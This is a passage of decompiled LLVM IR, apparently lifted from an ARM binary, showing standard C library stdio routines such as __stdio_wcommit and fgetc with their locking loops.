  %v6_163f0 = add i32 %v0_163f0, 8
  %v7_163f0 = inttoptr i32 %v6_163f0 to i32*
  %v8_163f0 = load i32, i32* %v7_163f0, align 4
  %v2_163f4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_163f4, i32* %r3.global-to-local, align 4
  store i32 %v2_163f0, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_16400 = load i32, i32* %r7.global-to-local, align 4
  %v2_16400 = add i32 %v0_16400, 76
  %v3_16400 = inttoptr i32 %v2_16400 to i32*
  %v4_16400 = load i32, i32* %v3_16400, align 4
  store i32 %v4_16400, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_16408 = inttoptr i32 %v4_16400 to i32*
  %v2_16408 = load i32, i32* %v1_16408, align 4
  store i32 %v2_16408, i32* %r5.global-to-local, align 4
  %v2_1640c = add i32 %v0_16400, 160
  %v3_1640c = inttoptr i32 %v2_1640c to i32*
  %v4_1640c = load i32, i32* %v3_1640c, align 4
  store i32 %v2_163f0, i32* %r0.global-to-local, align 4
  store i32 %v5_163f0, i32* %r1.global-to-local, align 4
  store i32 %v8_163f0, i32* %r2.global-to-local, align 4
  store i32 -33572, i32* %r3.global-to-local, align 4
  %v2_1641c = add i32 %v0_16400, -33572
  store i32 %v2_1641c, i32* %sl.global-to-local, align 4
  %v1_16420 = inttoptr i32 %v4_1640c to i32*
  store i32 %v2_163f0, i32* %v1_16420, align 4
  %v3_16420 = add i32 %v4_1640c, 4
  %v4_16420 = inttoptr i32 %v3_16420 to i32*
  %v5_16420 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16420, i32* %v4_16420, align 4
  %v6_16420 = add i32 %v4_1640c, 8
  %v7_16420 = inttoptr i32 %v6_16420 to i32*
  %v8_16420 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_16420, i32* %v7_16420, align 4
  %v0_164b0.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_164b016 = icmp eq i32 %v0_164b0.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_164b818 = add i32 %v0_164b0.pr, 56
  store i32 %v1_164b818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_164b016, label %dec_label_pc_164c4, label %dec_label_pc_16428

dec_label_pc_16428:                               ; preds = %entry, %.thread10
  %v0_16428 = phi i32 [ %v3_164ac, %.thread10 ], [ %v0_164b0.pr, %entry ]
  %v1_16428 = add i32 %v0_16428, 64
  %v2_16428 = inttoptr i32 %v1_16428 to i32*
  %v3_16428 = load i32, i32* %v2_16428, align 4
  store i32 %v3_16428, i32* %r3.global-to-local, align 4
  %v0_1642c = call i32 @__aeabi_read_tp()
  store i32 %v0_1642c, i32* %r0.global-to-local, align 4
  %v1_16430 = add i32 %v0_1642c, -1168
  store i32 %v1_16430, i32* %r6.global-to-local, align 4
  %v3_16434 = icmp uge i32 %v3_16428, %v1_16430
  store i1 %v3_16434, i1* %cpsr_c.global-to-local, align 1
  %v9_16434 = icmp eq i32 %v3_16428, %v1_16430
  br i1 %v9_16434, label %.thread1, label %dec_label_pc_16448

.thread1:                                         ; preds = %dec_label_pc_16428
  %v1_16438 = load i32, i32* %r5.global-to-local, align 4
  %v2_16438 = add i32 %v1_16438, 60
  %v3_16438 = inttoptr i32 %v2_16438 to i32*
  %v4_16438 = load i32, i32* %v3_16438, align 4
  %v2_1643c = add i32 %v4_16438, 1
  store i32 %v2_1643c, i32* %r3.global-to-local, align 4
  store i32 %v2_1643c, i32* %v3_16438, align 4
  br label %.thread10

dec_label_pc_16448:                               ; preds = %dec_label_pc_16428, %dec_label_pc_16454
  %v0_16448 = load i32, i32* %r2.global-to-local, align 4
  %v1_16448 = inttoptr i32 %v0_16448 to i32*
  %v2_16448 = load i32, i32* %v1_16448, align 4
  store i32 %v2_16448, i32* %r3.global-to-local, align 4
  %v1_1644c = load i32, i32* %r4.global-to-local, align 4
  %v3_1644c = icmp uge i32 %v2_16448, %v1_1644c
  store i1 %v3_1644c, i1* %cpsr_c.global-to-local, align 1
  %v9_1644c = icmp eq i32 %v2_16448, %v1_1644c
  br i1 %v9_1644c, label %dec_label_pc_16454, label %dec_label_pc_1646c

dec_label_pc_16454:                               ; preds = %dec_label_pc_16448
  store i32 %v2_16448, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16464 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16464, label %dec_label_pc_16468, label %dec_label_pc_16448

dec_label_pc_16468:                               ; preds = %dec_label_pc_16454
  %v0_16468 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16468, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1646c

dec_label_pc_1646c:                               ; preds = %dec_label_pc_16448, %dec_label_pc_16468
  %v0_1646c = phi i32 [ %v0_16468, %dec_label_pc_16468 ], [ %v2_16448, %dec_label_pc_16448 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1646c = icmp eq i32 %v0_1646c, 0
  %v2_16478.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_1646c, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_1646c
  %v1_16478 = load i32, i32* %r6.global-to-local, align 4
  %v3_16478 = add i32 %v2_16478.pre, 64
  %v4_16478 = inttoptr i32 %v3_16478 to i32*
  store i32 %v1_16478, i32* %v4_16478, align 4
  %v1_1647c = load i32, i32* %r1.global-to-local, align 4
  %v2_1647c = load i32, i32* %r5.global-to-local, align 4
  %v3_1647c = add i32 %v2_1647c, 60
  %v4_1647c = inttoptr i32 %v3_1647c to i32*
  store i32 %v1_1647c, i32* %v4_1647c, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_1646c
  %v2_16470 = add i32 %v2_16478.pre, 8
  %v3_16470 = inttoptr i32 %v2_16470 to i32*
  %v4_16470 = load i32, i32* %v3_16470, align 4
  store i32 %v4_16470, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_16480 = add i32 %v2_16478.pre, 20
  %v4_16480 = inttoptr i32 %v3_16480 to i32*
  store i32 %v4_16470, i32* %v4_16480, align 4
  %v1_16484 = load i32, i32* %r2.global-to-local, align 4
  %v2_16484 = trunc i32 %v1_16484 to i16
  %v3_16484 = load i32, i32* %r5.global-to-local, align 4
  %v4_16484 = inttoptr i32 %v3_16484 to i16*
  store i16 %v2_16484, i16* %v4_16484, align 2
  %v1_16488 = load i32, i32* %r3.global-to-local, align 4
  %v2_16488 = load i32, i32* %r5.global-to-local, align 4
  %v3_16488 = add i32 %v2_16488, 24
  %v4_16488 = inttoptr i32 %v3_16488 to i32*
  store i32 %v1_16488, i32* %v4_16488, align 4
  %v1_1648c = load i32, i32* %r3.global-to-local, align 4
  %v2_1648c = load i32, i32* %r5.global-to-local, align 4
  %v3_1648c = add i32 %v2_1648c, 28
  %v4_1648c = inttoptr i32 %v3_1648c to i32*
  store i32 %v1_1648c, i32* %v4_1648c, align 4
  %v1_16490 = load i32, i32* %r3.global-to-local, align 4
  %v2_16490 = load i32, i32* %r5.global-to-local, align 4
  %v3_16490 = add i32 %v2_16490, 16
  %v4_16490 = inttoptr i32 %v3_16490 to i32*
  store i32 %v1_16490, i32* %v4_16490, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_16494 = load i32, i32* %sl.global-to-local, align 4
  %v1_16494 = inttoptr i32 %v0_16494 to i32*
  %v2_16494 = load i32, i32* %v1_16494, align 4
  store i32 %v2_16494, i32* %r0.global-to-local, align 4
  %v3_16494 = add i32 %v0_16494, 4
  %v4_16494 = inttoptr i32 %v3_16494 to i32*
  %v5_16494 = load i32, i32* %v4_16494, align 4
  store i32 %v5_16494, i32* %r1.global-to-local, align 4
  %v6_16494 = add i32 %v0_16494, 8
  %v7_16494 = inttoptr i32 %v6_16494 to i32*
  %v8_16494 = load i32, i32* %v7_16494, align 4
  store i32 %v8_16494, i32* %r2.global-to-local, align 4
  %v1_1649c = load i32, i32* %r5.global-to-local, align 4
  %v2_1649c = add i32 %v1_1649c, 52
  %v3_1649c = inttoptr i32 %v2_1649c to i32*
  store i32 1, i32* %v3_1649c, align 4
  %v0_164a0 = load i32, i32* %r5.global-to-local, align 4
  %v1_164a0 = add i32 %v0_164a0, 56
  store i32 %v1_164a0, i32* %r3.global-to-local, align 4
  %v2_164a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_164a8 = inttoptr i32 %v1_164a0 to i32*
  store i32 %v2_164a4, i32* %v1_164a8, align 4
  %v3_164a8 = add i32 %v0_164a0, 60
  %v4_164a8 = inttoptr i32 %v3_164a8 to i32*
  %v5_164a8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_164a8, i32* %v4_164a8, align 4
  %v6_164a8 = add i32 %v0_164a0, 64
  %v7_164a8 = inttoptr i32 %v6_164a8 to i32*
  %v8_164a8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_164a8, i32* %v7_164a8, align 4
  %v0_164ac = load i32, i32* %r5.global-to-local, align 4
  %v1_164ac = add i32 %v0_164ac, 32
  %v2_164ac = inttoptr i32 %v1_164ac to i32*
  %v3_164ac = load i32, i32* %v2_164ac, align 4
  store i32 %v3_164ac, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_164b0 = icmp eq i32 %v3_164ac, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_164b8 = add i32 %v3_164ac, 56
  store i32 %v1_164b8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_164b0, label %dec_label_pc_164c4, label %dec_label_pc_16428

dec_label_pc_164c4:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_164c8 = load i32, i32* %r7.global-to-local, align 4
  %v2_164c8 = add i32 %v0_164c8, 76
  %v3_164c8 = inttoptr i32 %v2_164c8 to i32*
  %v4_164c8 = load i32, i32* %v3_164c8, align 4
  store i32 %v4_164c8, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_164c8 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_164e814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_164e814, label %dec_label_pc_164f0, label %dec_label_pc_164d4

dec_label_pc_164d4:                               ; preds = %dec_label_pc_164c4, %dec_label_pc_164e8
  %v1_164dc = phi i32 [ %storemerge, %dec_label_pc_164e8 ], [ %storemerge12, %dec_label_pc_164c4 ]
  %v1_164d4 = inttoptr i32 %v1_164dc to i16*
  %v2_164d4 = load i16, i16* %v1_164d4, align 2
  %v3_164d4 = zext i16 %v2_164d4 to i32
  store i32 %v3_164d4, i32* %r3.global-to-local, align 4
  %v1_164d8 = and i32 %v3_164d4, 64
  %v2_164d8 = icmp eq i32 %v1_164d8, 0
  br i1 %v2_164d8, label %dec_label_pc_164e8, label %bb39

bb39:                                             ; preds = %dec_label_pc_164d4
  store i32 %v1_164dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_164e8

dec_label_pc_164e8:                               ; preds = %dec_label_pc_164d4, %bb39
  %v1_164e0 = xor i1 %v2_164d8, true
  call void @__pseudo_cond_branch(i1 %v1_164e0, i32 ptrtoint (i32* @global_var_16518.629 to i32))
  %v0_164e4 = load i32, i32* %r4.global-to-local, align 4
  %v1_164e4 = add i32 %v0_164e4, 32
  %storemerge.in = inttoptr i32 %v1_164e4 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_164e8 = icmp eq i32 %storemerge, 0
  br i1 %v2_164e8, label %dec_label_pc_164f0, label %dec_label_pc_164d4

dec_label_pc_164f0:                               ; preds = %dec_label_pc_164e8, %dec_label_pc_164c4
  %v2_164f4 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_164f4, i32* %r4.global-to-local, align 4
  %v1_164f8 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_164f8

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_164ac, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1644c, { 1, 0 }
  uselistorder i32 %v4_1640c, { 2, 1, 0 }
  uselistorder i32 %v4_163dc, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 6, 5, 1, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_164e8, { 1, 0 }
  uselistorder label %dec_label_pc_164d4, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1646c, { 1, 0 }
  uselistorder label %dec_label_pc_16448, { 1, 0 }
  uselistorder label %dec_label_pc_16428, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16518 = load i32, i32* @r4, align 4
  store i32 %v3_16518, i32* %stack_var_-8, align 4
  %v1_1651c = add i32 %arg1, 8
  %v2_1651c = inttoptr i32 %v1_1651c to i32*
  %v3_1651c = load i32, i32* %v2_1651c, align 4
  store i32 %v3_1651c, i32* @r1, align 4
  %v1_16520 = add i32 %arg1, 16
  %v2_16520 = inttoptr i32 %v1_16520 to i32*
  %v3_16520 = load i32, i32* %v2_16520, align 4
  %v9_16524 = icmp eq i32 %v3_16520, %v3_1651c
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_16524, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_1651c, i32* %v2_16520, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_16530 = xor i1 %v9_16524, true
  call void @__pseudo_cond_branch(i1 %v1_16530, i32 ptrtoint (i32* @global_var_17f08.630 to i32))
  %v0_16534 = load i32, i32* %r4.global-to-local, align 4
  %v1_16534 = add i32 %v0_16534, 8
  %v2_16534 = inttoptr i32 %v1_16534 to i32*
  %v3_16534 = load i32, i32* %v2_16534, align 4
  %v1_16538 = add i32 %v0_16534, 16
  %v2_16538 = inttoptr i32 %v1_16538 to i32*
  %v3_16538 = load i32, i32* %v2_16538, align 4
  %v2_1653c = sub i32 %v3_16538, %v3_16534
  %v2_16540 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16540, i32* @r4, align 4
  ret i32 %v2_1653c

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_16548 = load i32, i32* @r4, align 4
  store i32 %v3_16548, i32* %stack_var_-20, align 4
  %v6_16548 = load i32, i32* @r5, align 4
  %v9_16548 = load i32, i32* @r6, align 4
  %v12_16548 = load i32, i32* @r7, align 4
  %v15_16548 = load i32, i32* @lr, align 4
  %v1_1654c = add i32 %arg1, 52
  %v2_1654c = inttoptr i32 %v1_1654c to i32*
  %v3_1654c = load i32, i32* %v2_1654c, align 4
  store i32 %v3_1654c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16550 = icmp eq i32 %v3_1654c, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_16550, label %dec_label_pc_16584, label %dec_label_pc_16560

dec_label_pc_16560:                               ; preds = %entry
  %v1_16560 = add i32 %arg1, 16
  %v2_16560 = inttoptr i32 %v1_16560 to i32*
  %v3_16560 = load i32, i32* %v2_16560, align 4
  store i32 %v3_16560, i32* %r2.global-to-local, align 4
  %v1_16564 = add i32 %arg1, 24
  %v2_16564 = inttoptr i32 %v1_16564 to i32*
  %v3_16564 = load i32, i32* %v2_16564, align 4
  store i32 %v3_16564, i32* %r3.global-to-local, align 4
  %v3_16568 = icmp uge i32 %v3_16560, %v3_16564
  store i1 %v3_16568, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_16568, label %dec_label_pc_16578, label %.thread

.thread:                                          ; preds = %dec_label_pc_16560
  %v2_1656c = inttoptr i32 %v3_16560 to i8*
  %v3_1656c = load i8, i8* %v2_1656c, align 1
  %v4_1656c = zext i8 %v3_1656c to i32
  store i32 %v4_1656c, i32* %r5.global-to-local, align 4
  %v6_1656c = add i32 %v3_16560, 1
  store i32 %v6_1656c, i32* %r2.global-to-local, align 4
  store i32 %v6_1656c, i32* %v2_16560, align 4
  br label %dec_label_pc_1667c

dec_label_pc_16578:                               ; preds = %dec_label_pc_16560
  %v1_16578 = inttoptr i32 %arg1 to i16*
  %v2_16578 = call i32 @getc_unlocked(i16* %v1_16578)
  store i32 %v2_16578, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1667c

dec_label_pc_16584:                               ; preds = %entry
  %v0_16584 = call i32 @__aeabi_read_tp()
  %v0_16588 = load i32, i32* @r7, align 4
  %v1_16588 = add i32 %v0_16588, 64
  %v2_16588 = inttoptr i32 %v1_16588 to i32*
  %v3_16588 = load i32, i32* %v2_16588, align 4
  store i32 %v3_16588, i32* %r3.global-to-local, align 4
  %v1_1658c = add i32 %v0_16584, -1168
  store i32 %v1_1658c, i32* @r6, align 4
  %v3_16590 = icmp uge i32 %v3_16588, %v1_1658c
  store i1 %v3_16590, i1* %cpsr_c.global-to-local, align 1
  %v9_16590 = icmp eq i32 %v3_16588, %v1_1658c
  br i1 %v9_16590, label %dec_label_pc_165d8, label %dec_label_pc_16598

dec_label_pc_16598:                               ; preds = %dec_label_pc_16584
  %v1_16598 = add i32 %v0_16588, 56
  store i32 %v1_16598, i32* @r5, align 4
  store i32 %v1_16598, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_165a4

dec_label_pc_165a4:                               ; preds = %dec_label_pc_165b0.dec_label_pc_165a4_crit_edge, %dec_label_pc_16598
  %v0_165a4 = phi i32 [ %v0_165a4.pre, %dec_label_pc_165b0.dec_label_pc_165a4_crit_edge ], [ %v1_16598, %dec_label_pc_16598 ]
  %v1_165a4 = inttoptr i32 %v0_165a4 to i32*
  %v2_165a4 = load i32, i32* %v1_165a4, align 4
  store i32 %v2_165a4, i32* %r3.global-to-local, align 4
  %v1_165a8 = load i32, i32* @r4, align 4
  %v3_165a8 = icmp uge i32 %v2_165a4, %v1_165a8
  store i1 %v3_165a8, i1* %cpsr_c.global-to-local, align 1
  %v9_165a8 = icmp eq i32 %v2_165a4, %v1_165a8
  br i1 %v9_165a8, label %dec_label_pc_165b0, label %dec_label_pc_165c8

dec_label_pc_165b0:                               ; preds = %dec_label_pc_165a4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_165c0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_165c0, label %dec_label_pc_165c4, label %dec_label_pc_165b0.dec_label_pc_165a4_crit_edge

dec_label_pc_165b0.dec_label_pc_165a4_crit_edge:  ; preds = %dec_label_pc_165b0
  %v0_165a4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_165a4

dec_label_pc_165c4:                               ; preds = %dec_label_pc_165b0
  %v0_165c4 = load i32, i32* @r4, align 4
  store i32 %v0_165c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_165c8

dec_label_pc_165c8:                               ; preds = %dec_label_pc_165a4, %dec_label_pc_165c4
  %v0_165c8 = phi i32 [ %v0_165c4, %dec_label_pc_165c4 ], [ %v2_165a4, %dec_label_pc_165a4 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_165c8 = icmp eq i32 %v0_165c8, 0
  br i1 %v2_165c8, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_165c8
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_165c8, %bb
  store i32 91604, i32* @lr, align 4
  %v1_165d0 = xor i1 %v2_165c8, true
  call void @__pseudo_cond_branch(i1 %v1_165d0, i32 ptrtoint (i32* @global_var_143ac.505 to i32))
  %v0_165d4 = load i32, i32* @r6, align 4
  %v1_165d4 = load i32, i32* @r7, align 4
  %v2_165d4 = add i32 %v1_165d4, 64
  %v3_165d4 = inttoptr i32 %v2_165d4 to i32*
  store i32 %v0_165d4, i32* %v3_165d4, align 4
  %v0_165d8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_165d8

dec_label_pc_165d8:                               ; preds = %dec_label_pc_16584, %bb18
  %v1_165e8 = phi i32 [ %v0_16588, %dec_label_pc_16584 ], [ %v0_165d8.pre, %bb18 ]
  %v1_165d8 = add i32 %v1_165e8, 60
  %v2_165d8 = inttoptr i32 %v1_165d8 to i32*
  %v3_165d8 = load i32, i32* %v2_165d8, align 4
  store i32 %v3_165d8, i32* %r2.global-to-local, align 4
  %v1_165dc = add i32 %v1_165e8, 16
  %v2_165dc = inttoptr i32 %v1_165dc to i32*
  %v3_165dc = load i32, i32* %v2_165dc, align 4
  store i32 %v3_165dc, i32* @r1, align 4
  %v1_165e0 = add i32 %v1_165e8, 24
  %v2_165e0 = inttoptr i32 %v1_165e0 to i32*
  %v3_165e0 = load i32, i32* %v2_165e0, align 4
  store i32 %v3_165e0, i32* %r3.global-to-local, align 4
  %v1_165e4 = add i32 %v3_165d8, 1
  store i32 %v1_165e4, i32* %r2.global-to-local, align 4
  store i32 %v1_165e4, i32* %v2_165d8, align 4
  %v0_165ec = load i32, i32* @r1, align 4
  %v1_165ec = load i32, i32* %r3.global-to-local, align 4
  %v3_165ec = icmp uge i32 %v0_165ec, %v1_165ec
  store i1 %v3_165ec, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_165ec, label %dec_label_pc_165fc, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_165d8
  %v2_165f0 = inttoptr i32 %v0_165ec to i8*
  %v3_165f0 = load i8, i8* %v2_165f0, align 1
  %v4_165f0 = zext i8 %v3_165f0 to i32
  store i32 %v4_165f0, i32* %r5.global-to-local, align 4
  %v6_165f0 = add i32 %v0_165ec, 1
  store i32 %v6_165f0, i32* @r1, align 4
  %v2_165f4 = load i32, i32* @r7, align 4
  %v3_165f4 = add i32 %v2_165f4, 16
  %v4_165f4 = inttoptr i32 %v3_165f4 to i32*
  store i32 %v6_165f0, i32* %v4_165f4, align 4
  br label %dec_label_pc_16608

dec_label_pc_165fc:                               ; preds = %dec_label_pc_165d8
  %v0_165fc = load i32, i32* @r7, align 4
  %v1_16600 = inttoptr i32 %v0_165fc to i16*
  %v2_16600 = call i32 @getc_unlocked(i16* %v1_16600)
  store i32 %v2_16600, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16608

dec_label_pc_16608:                               ; preds = %.thread2, %dec_label_pc_165fc
  %v0_16608 = load i32, i32* @r7, align 4
  %v1_16608 = add i32 %v0_16608, 60
  %v2_16608 = inttoptr i32 %v1_16608 to i32*
  %v3_16608 = load i32, i32* %v2_16608, align 4
  %v1_1660c = add i32 %v3_16608, -1
  store i32 %v1_1660c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16610 = icmp eq i32 %v1_1660c, 0
  store i32 %v1_1660c, i32* %v2_16608, align 4
  br i1 %v2_16610, label %dec_label_pc_1661c, label %dec_label_pc_1667c

dec_label_pc_1661c:                               ; preds = %dec_label_pc_16608
  %v0_1661c = load i32, i32* %r3.global-to-local, align 4
  %v1_1661c = load i32, i32* @r7, align 4
  %v2_1661c = add i32 %v1_1661c, 64
  %v3_1661c = inttoptr i32 %v2_1661c to i32*
  store i32 %v0_1661c, i32* %v3_1661c, align 4
  %v0_16620 = load i32, i32* @r7, align 4
  %v1_16620 = add i32 %v0_16620, 56
  store i32 %v1_16620, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16624

dec_label_pc_16624:                               ; preds = %dec_label_pc_16654.dec_label_pc_16624_crit_edge, %dec_label_pc_1661c
  %v0_1662c = phi i32 [ %v0_1662c.pre, %dec_label_pc_16654.dec_label_pc_16624_crit_edge ], [ %v1_16620, %dec_label_pc_1661c ]
  %v0_16624 = phi i32 [ %v0_16624.pre, %dec_label_pc_16654.dec_label_pc_16624_crit_edge ], [ %v0_16620, %dec_label_pc_1661c ]
  %v1_16624 = add i32 %v0_16624, 56
  %v2_16624 = inttoptr i32 %v1_16624 to i32*
  %v3_16624 = load i32, i32* %v2_16624, align 4
  store i32 %v3_16624, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1662c, i32* %r2.global-to-local, align 4
  %v1_1663022 = inttoptr i32 %v0_1662c to i32*
  %v2_1663023 = load i32, i32* %v1_1663022, align 4
  store i32 %v2_1663023, i32* %r3.global-to-local, align 4
  %v3_1663425 = icmp uge i32 %v2_1663023, %v3_16624
  store i1 %v3_1663425, i1* %cpsr_c.global-to-local, align 1
  %v9_1663431 = icmp eq i32 %v2_1663023, %v3_16624
  br i1 %v9_1663431, label %dec_label_pc_1663c, label %dec_label_pc_16654

dec_label_pc_1663c:                               ; preds = %dec_label_pc_16624, %dec_label_pc_1663c.dec_label_pc_16630_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1664c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1664c, label %dec_label_pc_16650, label %dec_label_pc_1663c.dec_label_pc_16630_crit_edge

dec_label_pc_1663c.dec_label_pc_16630_crit_edge:  ; preds = %dec_label_pc_1663c
  %v0_16630.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16634.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16630 = inttoptr i32 %v0_16630.pre to i32*
  %v2_16630 = load i32, i32* %v1_16630, align 4
  store i32 %v2_16630, i32* %r3.global-to-local, align 4
  %v3_16634 = icmp uge i32 %v2_16630, %v1_16634.pre
  store i1 %v3_16634, i1* %cpsr_c.global-to-local, align 1
  %v9_16634 = icmp eq i32 %v2_16630, %v1_16634.pre
  br i1 %v9_16634, label %dec_label_pc_1663c, label %dec_label_pc_16654

dec_label_pc_16650:                               ; preds = %dec_label_pc_1663c
  %v0_16650 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16650, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16654

dec_label_pc_16654:                               ; preds = %dec_label_pc_16624, %dec_label_pc_1663c.dec_label_pc_16630_crit_edge, %dec_label_pc_16650
  %v0_1665c = phi i32 [ %v0_16650, %dec_label_pc_16650 ], [ %v2_1663023, %dec_label_pc_16624 ], [ %v2_16630, %dec_label_pc_1663c.dec_label_pc_16630_crit_edge ]
  %v1_16654 = phi i32 [ %v0_16650, %dec_label_pc_16650 ], [ %v3_16624, %dec_label_pc_16624 ], [ %v1_16634.pre, %dec_label_pc_1663c.dec_label_pc_16630_crit_edge ]
  %v3_16654 = icmp uge i32 %v0_1665c, %v1_16654
  store i1 %v3_16654, i1* %cpsr_c.global-to-local, align 1
  %v9_16654 = icmp eq i32 %v0_1665c, %v1_16654
  br i1 %v9_16654, label %dec_label_pc_1665c, label %dec_label_pc_16654.dec_label_pc_16624_crit_edge

dec_label_pc_16654.dec_label_pc_16624_crit_edge:  ; preds = %dec_label_pc_16654
  %v0_16624.pre = load i32, i32* @r7, align 4
  %v0_1662c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16624

dec_label_pc_1665c:                               ; preds = %dec_label_pc_16654
  %v2_1665c = icmp ne i32 %v1_16654, 0
  store i1 %v2_1665c, i1* %cpsr_c.global-to-local, align 1
  %v7_16660 = icmp slt i32 %v1_16654, 2
  br i1 %v7_16660, label %dec_label_pc_1667c, label %dec_label_pc_16664

dec_label_pc_16664:                               ; preds = %dec_label_pc_1665c
  %v0_16668 = load i32, i32* @r1, align 4
  %v1_16668 = add i32 %v0_16668, 129
  store i32 %v1_16668, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1667c

dec_label_pc_1667c:                               ; preds = %.thread, %dec_label_pc_16608, %dec_label_pc_16664, %dec_label_pc_1665c, %dec_label_pc_16578
  %v0_1667c = load i32, i32* %r5.global-to-local, align 4
  %v2_16684 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16684, i32* @r4, align 4
  store i32 %v6_16548, i32* @r5, align 4
  store i32 %v9_16548, i32* @r6, align 4
  store i32 %v12_16548, i32* @r7, align 4
  store i32 %v15_16548, i32* @lr, align 4
  ret i32 %v0_1667c

; uselistorder directives
  uselistorder i32 %v0_16650, { 1, 0, 2 }
